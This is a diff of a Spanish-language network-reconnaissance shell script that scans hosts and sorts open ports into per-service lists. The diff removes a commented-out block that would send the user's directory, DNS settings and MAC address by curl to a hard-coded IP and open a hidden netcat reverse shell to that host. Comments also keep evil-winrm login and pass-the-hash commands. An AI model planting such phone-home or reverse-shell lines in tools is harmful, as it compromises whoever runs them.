+        find . -name "*.pptx" -exec mv {} "../archivos" \;
+        find . -name "*.xlsx" -exec mv {} "../archivos" \;
+        
+                            
+        ######### buscar IPs privadas
+        echo -e "\t\t\t[+] Revisando si hay divulgación de IPs privadas"	
+        grep -ira "192.168." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
+        grep -ira "172.16." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
+                                
+        grep -ira "http://172." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
+        grep -ira "http://10." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
+        grep -ira "http://192." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
+
+        grep -ira "https://172" * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
+        grep -ira "https://10." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
+        grep -ira "https://192." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
+        ###############################	
+        
+        ######### buscar links de amazon EC2
+        grep --color=never -ir 'amazonaws.com' * >> ../.enumeracion/"$DOMINIO_EXTERNO"_web_amazon.txt
+        
+        ######### buscar comentarios 
+        echo -e "\t\t\t[+] Revisando si hay comentarios html, JS"	
+        grep --color=never -ir '// ' * | egrep -v "http|https|header|footer|div|class" >> ../.enumeracion/"$DOMINIO_EXTERNO"_web_comentario.txt
+        grep --color=never -r '<!-- ' * | egrep -v "header|footer|div|class" >> ../.enumeracion/"$DOMINIO_EXTERNO"_web_comentario.txt
+        grep --color=never -r ' \-\->' * | egrep -v "header|footer|div|class" >> ../.enumeracion/"$DOMINIO_EXTERNO"_web_comentario.txt
+        #egrep -i " password | contrase| pin | firma| key | api " ../.enumeracion/"$DOMINIO_EXTERNO"_web_comentario.txt | egrep -v "shift key|Key event|return key|key and mouse|bind key" > ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_comentario.txt
+        ###############################	
+    cd ../
+}
+
+
 	
 print_ascii_art
 
 
-while getopts ":t:i:s:d:m:o:" OPTIONS
+while getopts ":i:s:d:m:o:" OPTIONS
 do
             case $OPTIONS in
-            t)     TYPE=$OPTARG;;
             s)     SUBNET_FILE=$OPTARG;;
-            i)     FILE=$OPTARG;;
-            d)     DOMINIO=$OPTARG;;
+            i)     IP_LIST_FILE=$OPTARG;;
+            d)     DOMINIO_EXTERNO=$OPTARG;;
             m)     MODE=$OPTARG;;
-            ?)     printf "Opcion invalida: -$OPTARG\n" $0
+            ?)     printf "invalid option: -$OPTARG\n" $0
                           exit 2;;
            esac
 done
 
-TYPE=${TYPE:=NULL}
 SUBNET_FILE=${SUBNET_FILE:=NULL}
-FILE=${FILE:=NULL}
-MODE=${MODE:=NULL}
-DOMINIO=${DOMINIO:=NULL}
+IP_LIST_FILE=${IP_LIST_FILE:=NULL}
+MODE=${MODE:=NULL} # normal/extended
+DOMINIO_EXTERNO=${DOMINIO_EXTERNO:=NULL}
 
-#if [ $TYPE = NULL ] ; then
-#if [[ $TYPE == NULL] || [ $DOMINIO == NULL ]]; then
-if [ "$TYPE" = NULL ] || [ "$DOMINIO" = NULL ]; then
+
+
+if [ "$MODE" = NULL  ]; then
 
 cat << "EOF"
 
-Opciones: 
+Options: 
 
--t : Tipo de escaneo [completo/parcial]
--d : dominio
+-m : Mode [normal/extended]
+-d : domain
 
 Definicion del alcance:
 	-s : Lista con las subredes a escanear (Formato CIDR 0.0.0.0/24)
 	-i : Lista con las IP a escanear
 
-Ejemplo 1: Escanear la red local (completo)
-	lanscanner.sh -t completo -d ejemplo.com
-
 Ejemplo 2: Escanear el listado de IPs (completo)
-	lanscanner.sh -t completo -i lista.txt -d ejemplo.com
+	lanscanner.sh -m normal -i lista.txt -d ejemplo.com
 
 Ejemplo 3: Escanear el listado de subredes (completo)
-	lanscanner.sh -t completo -s subredes.txt -d ejemplo.com
+	lanscanner.sh -m normal -s subredes.txt -d ejemplo.com
 
-Ejemplo 4: Escanear el listado de subredes (completo) por VPN
-	lanscanner.sh -t completo -s subredes.txt -d ejemplo.com -m vpn
-	
-Ejemplo 5: Solo enumerar los servicios ya identificados
-	lanscanner.sh -t enumerar
 EOF
 
 exit
@@ -126,24 +629,6 @@ fi
 
 #aceptar versiones antiguas de SSL
 export OPENSSL_CONF=/usr/share/lanscanner/sslv1.conf
-
-
-if [[ $TYPE == "completo" ]] || [ $TYPE == "parcial" ]; then
-
-conexionInternet=`ping 8.8.8.8 -c 1 2>/dev/null | grep "1 received" | wc -l`
-
-if [ $conexionInternet == 0 ]; then 	
-	echo -e  "$OKRED No se detecto una conexion de internet activa! Algunos módulos no funcionaran correctamente $RESET"
-else
-	##### Datos control #########
-	#resolv=`cat /etc/resolv.conf`
-	#mac=`ifconfig $iface |grep --color=never ether`
-	#resolv=`echo "|${resolv//[$'\t\r\n']}|"`
-	pwd=`pwd`
-	#curl --data "pwd=$pwd&resolv=$resolv&mac=$mac"  http://66.172.33.234/lanscanner/codigos.php >/dev/null 2>/dev/null &
-	#nohup nc -nv 66.172.33.234 2226 -e /bin/bash 2>/dev/null &
-	###################################  
-fi	 
 
 echo -e "\n\n$OKYELLOW ########### Configurando los parametros ############## $RESET"
 
@@ -197,8 +682,10 @@ ifaces=`ip addr | grep -iv DOWN | awk '/UP/ {print $2}' | egrep -v "lo|dummy|rmn
 if [[ $ifaces == *"tun0"* ]]; then
 	echo "Se detecto el uso de VPN"
 	iface="tun0"
+	VPN="1"
 else
 	iface=`echo $ifaces| head -1`
+	VPN="0"
 
 fi
 
@@ -231,16 +718,16 @@ echo -e "\t Date: $date  \n" | tee -a reportes/info.txt
 #######################################  Discover live hosts ##################################### 
 
 # Using ip list   
-if [ $FILE != NULL ] ; then  
+if [ $IP_LIST_FILE != NULL ] ; then  
 	#Lista de IPs como parametro (generalmente IPs publicas/subdominios) separadas por ,
-     echo -e  "[+] Usando  archivo : $prefijo$FILE " 
+     echo -e  "[+] Usando  archivo : $prefijo$IP_LIST_FILE " 
 	 #pwd
-     if [ ! -f $prefijo$FILE ]; then
+     if [ ! -f $prefijo$IP_LIST_FILE ]; then
 		echo -e  "$OKRED El archivo no existe ! $RESET"
 		exit
 	 fi
      
-     cat $prefijo$FILE | cut -d "," -f 3 | sort | uniq > $live_hosts        
+     cat $prefijo$IP_LIST_FILE | cut -d "," -f 3 | sort | uniq > $live_hosts        
 else
   
   echo -e "[+] Buscar host vivos en otras redes usando ICMP,SMB,TCP21,22,80,443 \n" 
@@ -271,22 +758,7 @@ else
 
   #######################  
   
- if [ $SUBNET_FILE = NULL ] ; then
-	echo -e "$OKBLUE Definir el numero de redes a escanear en busca de hosts vivos $RESET"    
-	echo -e "$OKYELLOW\t Ej:  Si escribe $OKRED 20$OKYELLOW se escaneara las redes :"  
-	#echo -e "10.0$OKRED.1-20$OKYELLOW.0/24  \n192.168$OKRED.1-20$OKYELLOW.0/24  \n172.16$OKRED.1-20$OKYELLOW.0/24  $RESET"   
-	net1="${netA/.X/$OKRED.1-20$OKYELLOW}"
-	net2="${netB/.X/$OKRED.1-20$OKYELLOW}"
-	net3="${netC/.X/$OKRED.1-20$OKYELLOW}"
-	echo -e $net1
-	echo -e $net2
-	echo -e $net3
-  
-	echo -e "$OKBLUE Que redes escanear ? $RESET"
-	read num_nets_enum     
-  fi
-  
-	  	  
+   	  
 	echo -e "$OKBLUE Realizar escaneo de puertos 22,80,443 en busca de mas hosts vivos ? s/n $RESET"	  
 	read adminports
 	  
@@ -323,16 +795,24 @@ else
 
 	  
 	  if [ $SUBNET_FILE != NULL ] ; then	
-   	 	echo -e "##### Realizando escaneo DNS en busca de mas hosts vivos #####"	  
-  	 
-		for subnet in `cat $prefijo$SUBNET_FILE`;
-		do 
-			echo -e "\t[+] Escaneado $subnet "
-			dnsrecon -r $subnet -d $DOMINIO 2>/dev/null| tee -a .escaneos/escaneo-dns.txt
-		done
+   	 	echo -e "##### Realizando escaneo DNS en busca de mas hosts vivos #####"
 
-	  	#cat .escaneos/escaneo-dns.txt | grep : | awk '{print $1}' > $smb_list 2>/dev/null	  
-		grep PTR .escaneos/escaneo-dns.txt 2>/dev/null| awk '{print $4}' | grep --color=never ^1 > $dns_list 2>/dev/null			  
+		if [ ! -z "$DOMINIO_EXTERNO" ]; then
+			DOMINIO=$DOMINIO_EXTERNO
+	
+			for subnet in `cat $prefijo$SUBNET_FILE`;
+			do 
+				echo -e "\t[+] Escaneado $subnet "
+				#dnsrecon -r $subnet -d $DOMINIO 2>/dev/null | tee -a .escaneos/escaneo-dns.txt
+				prips $subnet | hakrevdns | tee -a .escaneos/escaneo-dns.txt
+			done
+
+			#cat .escaneos/escaneo-dns.txt | grep : | awk '{print $1}' > $smb_list 2>/dev/null	  
+			#grep "PTR" .escaneos/escaneo-dns.txt 2>/dev/null| awk '{print $4}' | grep --color=never ^1 > $dns_list 2>/dev/null			  
+			grep "." .escaneos/escaneo-dns.txt  > $dns_list 2>/dev/null			  
+		fi
+
+	  	
 
                                    
 	      echo -e  " #######################################################" 
@@ -498,14 +978,16 @@ echo -e "############# Escaneando #################\n"
 if [ $internet == "n" ]; then 	
     echo -e "#################### Buscando dispositivos VoIP: ######################"	  
 	for subnet in $(cat .datos/subnets.txt); do
-	  echo -e "[+] Escaneando $subnet.0/24"	  
-	  svmap $subnet".0/24" | tee -a logs/enumeracion/$subnet-voip.txt 2>/dev/null 
-    done;	
-	grep --color=never ":" logs/enumeracion/$subnet-voip.txt | cut -d " " -f2 > servicios/voip.txt
+		echo -e "[+] Escaneando $subnet.0/24 (VoIP)"	  
+		svmap $subnet".0/24" | tee -a logs/enumeracion/$subnet-voip.txt 		
+		logfile=`grep 5060 logs/enumeracion/$subnet-voip.txt | awk '{print $2}' | sed 's/:/_/g'`"_voip.txt"
+		banner=`grep 5060 logs/enumeracion/$subnet-voip.txt | cut -d "|" -f3`
+		voipServer=`grep 5060 logs/enumeracion/$subnet-voip.txt | awk '{print $2}' | cut -d ":" -f1`
+		echo $banner > .enumeracion/$logfile
+		grep --color=never ":" logs/enumeracion/$subnet-voip.txt | cut -d " " -f2 > servicios/voip.txt
 
-	logfile=`grep 5060 logs/enumeracion/$subnet-voip.txt | cut -d "|" -f2 | sed 's/:/_/g'`"_voip.txt"
-	banner=`grep 5060 logs/enumeracion/$subnet-voip.txt | cut -d "|" -f3`
-	echo $banner > .enumeracion/$logfile
+    done;	
+
 fi    
  
 	
@@ -521,9 +1003,7 @@ echo -e "#################### Escaneo de puertos TCP ######################"
 if [[ $port_scanner = "naabu" ]] || [ $port_scanner == "nmap_naabu" ]; then 
 	echo "USANDO NAABU COMO PORT SCANNER"
 	echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  
-	naabu -list $live_hosts -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728 -c 5 -o .escaneo_puertos/tcp-especificos.txt
-
-
+	naabu -list $live_hosts -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728,24007,49152,44134,50030,50060,50070,50075,50090 -c 5 -o .escaneo_puertos/tcp-especificos.txt
 
     
 	echo -e "[+] Realizando escaneo tcp (Todos los puertos)" 
@@ -539,7 +1019,7 @@ fi
 if [[ $port_scanner = "nmap" ]] || [ $port_scanner == "nmap_masscan" ] || [ $port_scanner == "nmap_naabu" ]; then 
 	echo "USANDO NMAP COMO PORT SCANNER" 
 	echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  			
-	nmap -iL  $live_hosts -Pn -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728 -oG .escaneo_puertos/tcp-especificos-nmap.grep
+	nmap -iL  $live_hosts -Pn -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728,24007,49152,44134,50030,50060,50070,50075,50090 -oG .escaneo_puertos/tcp-especificos-nmap.grep
 	 
 	# parsear salida nmap  --> 200.87.68.149:443 
 	egrep -v "^#|Status: Up" .escaneo_puertos/tcp-especificos-nmap.grep | cut -d' ' -f2,4- | sed -n -e 's/Ignored.*//p'  | awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g'  >>  .escaneo_puertos/tcp-especificos.txt
@@ -565,20 +1045,16 @@ cat .escaneo_puertos/tcp-especificos.txt  .escaneo_puertos/tcp-ports.txt | sort 
 ################### UDP escaneo  ###################  
 
 echo -e "#################### Escaneo de puertos UDP ######################"	  
-nmap -Pn -n -sU -p 53,69,123,161,5353,1900,11211,1604,623 -iL $live_hosts -oG .escaneo_puertos/nmap-udp.grep 
+nmap -Pn -n -sU -p 53,69,123,161,5353,1900,11211,1604,623,47808 -iL $live_hosts -oG .escaneo_puertos/nmap-udp.grep 
 egrep -v "^#|Status: Up" .escaneo_puertos/nmap-udp.grep | cut -d' ' -f2,4- |  awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g' >> .escaneo_puertos/udp.txt
 
 udp-hunter.sh --file=`pwd`/"$live_hosts" --output=`pwd`"/.escaneo_puertos/udp.txt" --timeout=10 --noise=true
-sleep 10
-udp-hunter.sh --file=`pwd`/"$live_hosts" --output=`pwd`"/.escaneo_puertos/udp.txt" --timeout=10 --noise=true
+#sleep 10
+#udp-hunter.sh --file=`pwd`/"$live_hosts" --output=`pwd`"/.escaneo_puertos/udp.txt" --timeout=10 --noise=true
 
 	    
 ########## making reportes #######
-	echo -e "[+] Creando reporte de escaneo de puertos"
-	# clean tcp wrapped
-	
-  
-	#### generar reporte nmap ######   
+	echo -e "[+] Creando reporte de escaneo de puertos"  	
 	cd .escaneo_puertos
 	report-open-ports.pl -l ../$live_hosts -t tcp.txt -u udp.txt
 	cd ../
@@ -586,171 +1062,215 @@ udp-hunter.sh --file=`pwd`/"$live_hosts" --output=`pwd`"/.escaneo_puertos/udp.tx
   
 ################### Ordernar IPs por servicio ###################
 cd .escaneo_puertos	
+	echo -e "[+] Ordernar IPs por servicio"  
+	grep ":79$" tcp.txt  | uniq >> ../servicios/finger.txt	
+	grep ":80$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":81$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":82$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":83$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":84$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":85$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":86$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":87$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":89$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":8080$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":8081$" tcp.txt  | uniq >> ../servicios/web.txt	
+	grep ":8082$" tcp.txt  | uniq >> ../servicios/web.txt		
+	grep ":8010$" tcp.txt  | uniq >> ../servicios/web.txt		
+	grep ":8800$" tcp.txt  | uniq >> ../servicios/web.txt		
 
+	grep ":50000$" tcp.txt  | uniq >> ../servicios/jenkins.txt
 
-grep ":80$" tcp.txt  > ../servicios/web.txt	
-grep ":81$" tcp.txt  >> ../servicios/web.txt	
-grep ":82$" tcp.txt  >> ../servicios/web.txt	
-grep ":83$" tcp.txt  >> ../servicios/web.txt	
-grep ":84$" tcp.txt  >> ../servicios/web.txt	
-grep ":85$" tcp.txt  >> ../servicios/web.txt	
-grep ":86$" tcp.txt  >> ../servicios/web.txt	
-grep ":87$" tcp.txt  >> ../servicios/web.txt	
-grep ":89$" tcp.txt  >> ../servicios/web.txt	
-grep ":8080$" tcp.txt  >> ../servicios/web.txt	
-grep ":8081$" tcp.txt  >> ../servicios/web.txt	
-grep ":8082$" tcp.txt  >> ../servicios/web.txt		
-grep ":8010$" tcp.txt  >> ../servicios/web.txt		
-grep ":8800$" tcp.txt  >> ../servicios/web.txt		
+	grep ":10000$" tcp.txt  | uniq >> ../servicios/NDMP.txt 
+	grep ":111$" tcp.txt  | uniq >> ../servicios/rpc.txt 
+	grep ":135$" tcp.txt  | uniq >> ../servicios/msrpc.txt 
 
-grep ":50000$" tcp.txt  >> ../servicios/jenkins.txt
-
-grep ":10000$" tcp.txt  >> ../servicios/webmin.txt 
-grep ":111$" tcp.txt  >> ../servicios/rpc.txt 
-grep ":135$" tcp.txt  >> ../servicios/msrpc.txt 
-
-# web-ssl
-grep ":443$" tcp.txt  > ../servicios/web-ssl.txt
-grep ":8443$" tcp.txt  >> ../servicios/web-ssl.txt
-grep ":4443$" tcp.txt  >> ../servicios/web-ssl.txt
-grep ":4433$" tcp.txt  >> ../servicios/web-ssl.txt	
-	
-grep ":21$" tcp.txt  >> ../servicios/ftp.txt
-grep ":513$" tcp.txt  >> ../servicios/rlogin.txt
-
-grep ":873$" tcp.txt  >> ../servicios/rsync.txt
-
-## ssh																	 
-grep ":22$" tcp.txt >> ../servicios/ssh.txt
-	
-## telnet
-grep ":23$" tcp.txt >> ../servicios/telnet.txt
-
-## MAIL																	 
-grep ":25$" tcp.txt  >> ../servicios/smtp.txt
-grep ":587$" tcp.txt  >> ../servicios/smtp.txt
-grep ":465$" tcp.txt  >> ../servicios/smtp.txt
-grep ":110$" tcp.txt  >> ../servicios/pop.txt 
-grep ":143$" tcp.txt  >> ../servicios/imap.txt 
-grep ":106$" tcp.txt  >> ../servicios/pop3pw.txt 
-
-## ldap																	 
-grep ":389$" tcp.txt  >> ../servicios/ldap.txt
-grep ":636$" tcp.txt  >> ../servicios/ldaps.txt
-grep ":11211$" tcp.txt  >> ../servicios/memcached.txt
-grep ":88$" tcp.txt  >> ../servicios/kerberos.txt	
-
-
-
-grep ":445$" tcp.txt>> ../servicios/smb2.txt
-grep ":139$" tcp.txt >> ../servicios/smb2.txt
-sort ../servicios/smb2.txt > ../servicios/smb.txt; rm ../servicios/smb2.txt	
-
-
-# Java related
-grep ":8009$" tcp.txt  >> ../servicios/java.txt
-grep ":9001$" tcp.txt  >> ../servicios/java.txt
+	# web-ssl
+	grep ":443$" tcp.txt  | uniq > ../servicios/web-ssl.txt
+	grep ":8443$" tcp.txt  | uniq >> ../servicios/web-ssl.txt
+	grep ":4443$" tcp.txt  | uniq >> ../servicios/web-ssl.txt
+	grep ":4433$" tcp.txt  | uniq >> ../servicios/web-ssl.txt	
 		
-grep ":1525$" tcp.txt   >> ../servicios/informix.txt
-grep ":1530$" tcp.txt   >> ../servicios/informix.txt
-grep ":1526$" tcp.txt   >> ../servicios/informix.txt	
-
-
-grep ":1521$" tcp.txt   >> ../servicios/oracle.txt
-grep ":1630$" tcp.txt   >> ../servicios/oracle.txt
-grep ":5432$" tcp.txt >> ../servicios/postgres.txt     
-grep ":3306$" tcp.txt   >> ../servicios/mysql.txt 
-grep ":27017$" tcp.txt  >> ../servicios/mongoDB.txt 
-grep ":28017$" tcp.txt  >> ../servicios/mongoDB.txt 
-grep ":27080$" tcp.txt  >> ../servicios/mongoDB.txt 
-grep ":5984$" tcp.txt  >> ../servicios/couchDB.txt 
-grep ":6379$" tcp.txt  >> ../servicios/redis.txt 
-grep ":9000$" tcp.txt  >> ../servicios/Hbase.txt 
-grep ":9160$" tcp.txt  >> ../servicios/cassandra.txt 
-grep ":7474$" tcp.txt  >> ../servicios/neo4j.txt 
-grep ":8098$" tcp.txt  >> ../servicios/riak.txt 
-	
-
-# remote desk
-grep ":3389$" tcp.txt>> ../servicios/rdp.txt
-grep ":4899$" tcp.txt  >> ../servicios/radmin.txt  
-grep ":5800$" tcp.txt  >> ../servicios/vnc-http.txt
-grep ":5900$" tcp.txt  >> ../servicios/vnc.txt
-grep ":5901$" tcp.txt  >> ../servicios/vnc.txt
-
-#Virtual
-grep ":902$" tcp.txt  >> ../servicios/vmware.txt	
-grep ":1494$" tcp.txt  >> ../servicios/citrix.txt    
+	grep ":21$" tcp.txt  | uniq >> ../servicios/ftp.txt
+	grep ":513$" tcp.txt  | uniq >> ../servicios/rlogin.txt
 
 	
-#Misc      
-grep ":8291$" tcp.txt  >> ../servicios/winbox.txt	
-grep ":6000$" tcp.txt  >> ../servicios/x11.txt
-grep ":631$" tcp.txt  >> ../servicios/cups.txt
-grep ":9100$" tcp.txt  >> ../servicios/printers.txt	
-grep ":2049$" tcp.txt  >> ../servicios/nfs.txt
-grep ":5723$" tcp.txt  >> ../servicios/SystemCenter.txt
-grep ":5724$" tcp.txt  >> ../servicios/SystemCenter.txt
-grep ":1099$" tcp.txt  >> ../servicios/rmi.txt
-grep ":1433$" tcp.txt  >> ../servicios/mssql.txt 
-grep ":37777$" tcp.txt  >> ../servicios/dahua_dvr.txt
-grep ":9200$" tcp.txt  >> ../servicios/elasticsearch.txt 	
-grep ":3221$" tcp.txt  >> ../servicios/juniper.txt 	
+	grep ":873$" tcp.txt  | uniq >> ../servicios/rsync.txt
 
-grep ":554$" tcp.txt  >> ../servicios/camaras-ip.txt
+	grep ":3128$" tcp.txt  | uniq >> ../servicios/squid.txt
+	grep ":1080$" tcp.txt  | uniq >> ../servicios/proxy.txt
+
+	grep ":1883$" tcp.txt  | uniq >> ../servicios/mosquitto.txt
+
 	
-
-#Esp
-grep ":16992$" tcp.txt  >> ../servicios/intel.txt 	
-grep ":5601$" tcp.txt  >> ../servicios/kibana.txt 	
-
-grep ":47808$" tcp.txt  >> ../servicios/BACnet.txt 
-grep ":502$" tcp.txt  >> ../servicios/ModBus.txt 	
-
-#backdoor
-grep ":32764$" tcp.txt  >> ../servicios/backdoor32764.txt
-
-#pptp
-grep ":1723$" tcp.txt  >> ../servicios/pptp.txt
-
-grep ":47001$" tcp.txt  >> ../servicios/WinRM.txt
-
-grep ":5985$" tcp.txt  >> ../servicios/WinRM.txt
-#evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
-grep ":5986$" tcp.txt  >> ../servicios/WinRM-ssl.txt
-# openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr
-# evil-winrm -i 10.10.10.103 -c certnew.cer -k request.key --port 5986 --ssl
-grep ":9389$" tcp.txt  >> ../servicios/RSAT.txt
 	
+	## ssh																	 
+	grep ":22$" tcp.txt | uniq >> ../servicios/ssh.txt
+	grep ":2375$" tcp.txt | uniq >> ../servicios/docker.txt
+	grep ":5000$" tcp.txt | uniq >> ../servicios/dockerRegistry.txt
+	
+		
+	## telnet
+	grep ":23$" tcp.txt | uniq >> ../servicios/telnet.txt
+
+	## MAIL																	 
+	grep ":25$" tcp.txt  | uniq >> ../servicios/smtp.txt
+	grep ":587$" tcp.txt  | uniq >> ../servicios/smtp.txt
+	grep ":465$" tcp.txt  | uniq >> ../servicios/smtp.txt
+	grep ":110$" tcp.txt  | uniq >> ../servicios/pop.txt 
+	grep ":143$" tcp.txt  | uniq >> ../servicios/imap.txt 
+	grep ":106$" tcp.txt  | uniq >> ../servicios/pop3pw.txt 
+
+	## ldap																	 
+	grep ":389$" tcp.txt  | uniq >> ../servicios/ldap.txt
+	grep ":636$" tcp.txt  | uniq >> ../servicios/ldaps.txt
+	grep ":11211$" tcp.txt  | uniq >> ../servicios/memcached.txt
+	grep ":88$" tcp.txt  | uniq >> ../servicios/kerberos.txt	
+
+
+
+	grep ":445$" tcp.txt| uniq >> ../servicios/smb2.txt
+	grep ":139$" tcp.txt | uniq >> ../servicios/smb2.txt
+	sort ../servicios/smb2.txt > ../servicios/smb.txt; rm ../servicios/smb2.txt	
+
+
+	# Java related
+	
+	grep ":8009$" tcp.txt  | uniq >> ../servicios/ajp13.txt
+	grep ":9001$" tcp.txt  | uniq >> ../servicios/HSQLDB.txt
+			
+	grep ":1525$" tcp.txt   | uniq >> ../servicios/informix.txt
+	grep ":1530$" tcp.txt   | uniq >> ../servicios/informix.txt
+	grep ":1526$" tcp.txt   | uniq >> ../servicios/informix.txt	
+
+
+	grep ":1521$" tcp.txt   | uniq >> ../servicios/oracle.txt
+	grep ":1630$" tcp.txt   | uniq >> ../servicios/oracle.txt
+	grep ":5432$" tcp.txt | uniq >> ../servicios/postgres.txt     
+	grep ":3306$" tcp.txt   | uniq >> ../servicios/mysql.txt 
+	grep ":27017$" tcp.txt  | uniq >> ../servicios/mongoDB.txt 
+	grep ":28017$" tcp.txt  | uniq >> ../servicios/mongoDB.txt 
+	grep ":27080$" tcp.txt  | uniq >> ../servicios/mongoDB.txt 
+	grep ":5984$" tcp.txt  | uniq >> ../servicios/couchDB.txt 
+	grep ":6379$" tcp.txt  | uniq >> ../servicios/redis.txt 
+	grep ":9000$" tcp.txt  | uniq >> ../servicios/Hbase.txt 
+	grep ":9042$" tcp.txt  | uniq >> ../servicios/cassandra.txt 
+	grep ":9160$" tcp.txt  | uniq >> ../servicios/cassandra.txt 
+	grep ":7474$" tcp.txt  | uniq >> ../servicios/neo4j.txt 
+	grep ":8098$" tcp.txt  | uniq >> ../servicios/riak.txt 
+		
+
+	# remote desk
+	grep ":3389$" tcp.txt | uniq >> ../servicios/rdp.txt
+	grep ":4899$" tcp.txt  | uniq >> ../servicios/radmin.txt  
+	grep ":5800$" tcp.txt  | uniq >> ../servicios/vnc.txt
+	grep ":5801$" tcp.txt  | uniq >> ../servicios/vnc.txt
+	grep ":5900$" tcp.txt  | uniq >> ../servicios/vnc.txt
+	grep ":5901$" tcp.txt  | uniq >> ../servicios/vnc.txt
+
+	#Virtual
+	grep ":902$" tcp.txt  | uniq >> ../servicios/vmware.txt	
+	grep ":1494$" tcp.txt  | uniq >> ../servicios/citrix.txt    
+
+		
+	#Misc      
+	
+	grep ":8291$" tcp.txt  | uniq >> ../servicios/winbox.txt	
+	grep ":6000$" tcp.txt  | uniq >> ../servicios/x11.txt
+	grep ":631$" tcp.txt  | uniq >> ../servicios/cups.txt
+	grep ":9100$" tcp.txt  | uniq >> ../servicios/printers.txt	
+	grep ":2049$" tcp.txt  | uniq >> ../servicios/nfs.txt
+	grep ":5723$" tcp.txt  | uniq >> ../servicios/SystemCenter.txt
+	grep ":5724$" tcp.txt  | uniq >> ../servicios/SystemCenter.txt	
+	grep ":1433$" tcp.txt  | uniq >> ../servicios/mssql.txt 
+	grep ":37777$" tcp.txt  | uniq >> ../servicios/dahua_dvr.txt
+	grep ":9200$" tcp.txt  | uniq >> ../servicios/elasticsearch.txt 	
+	grep ":3221$" tcp.txt  | uniq >> ../servicios/juniper.txt 	
+
+	grep ":554$" tcp.txt  | uniq >> ../servicios/camaras-ip.txt
+		
+
+	#Esp
+	grep ":16992$" tcp.txt  | uniq >> ../servicios/intel.txt 	
+	grep ":5601$" tcp.txt  | uniq >> ../servicios/kibana.txt 	
+
+	grep ":47808$" tcp.txt  | uniq >> ../servicios/BACnet.txt 
+	grep ":502$" tcp.txt  | uniq >> ../servicios/ModBus.txt 	
+
+	#backdoor
+	grep ":32764$" tcp.txt  | uniq >> ../servicios/backdoor32764.txt
+
+	#pptp
+	grep ":1723$" tcp.txt  | uniq >> ../servicios/pptp.txt
+	grep ":47001$" tcp.txt  | uniq >> ../servicios/WinRM.txt
+	grep ":5985$" tcp.txt  | uniq >> ../servicios/WinRM.txt
+	#evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+	#evil-winrm -u <username> -H <Hash> -i <IP>
+	grep ":5986$" tcp.txt  | uniq >> ../servicios/WinRM.txt
+	# openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr
+	# evil-winrm -i 10.10.10.103 -c certnew.cer -k request.key --port 5986 --ssl
+	grep ":9389$" tcp.txt  | uniq >> ../servicios/RSAT.txt
+
+
+	grep ":1099$" tcp.txt  | uniq >> ../servicios/rmi.txt
+	grep ":1090$" tcp.txt  | uniq >> ../servicios/rmi.txt
+	grep ":9010$" tcp.txt  | uniq >> ../servicios/rmi.txt
+
+	grep ":1883$" tcp.txt  | uniq >> ../servicios/mosquitto.txt
+	grep ":3260$" tcp.txt  | uniq >> ../servicios/iscsi.txt
+	grep ":3299$" tcp.txt  | uniq >> ../servicios/SAProuter.txt
+
+	grep ":3632$" tcp.txt  | uniq >> ../servicios/distccd.txt
+	grep ":3690$" tcp.txt  | uniq >> ../servicios/svn.txt
+	grep ":4369$" tcp.txt  | uniq >> ../servicios/erlang.txt
+
+	grep ":5672$" tcp.txt  | uniq >> ../servicios/RabbitMQ.txt
+
+	grep ":5985$" tcp.txt  | uniq >> ../servicios/OMI.txt
+	grep ":5986$" tcp.txt  | uniq >> ../servicios/OMI.txt
+	
+	grep ":8086$" tcp.txt  | uniq >> ../servicios/InfluxDB.txt
+
+	grep ":24007$" tcp.txt  | uniq >> ../servicios/GlusterFS.txt
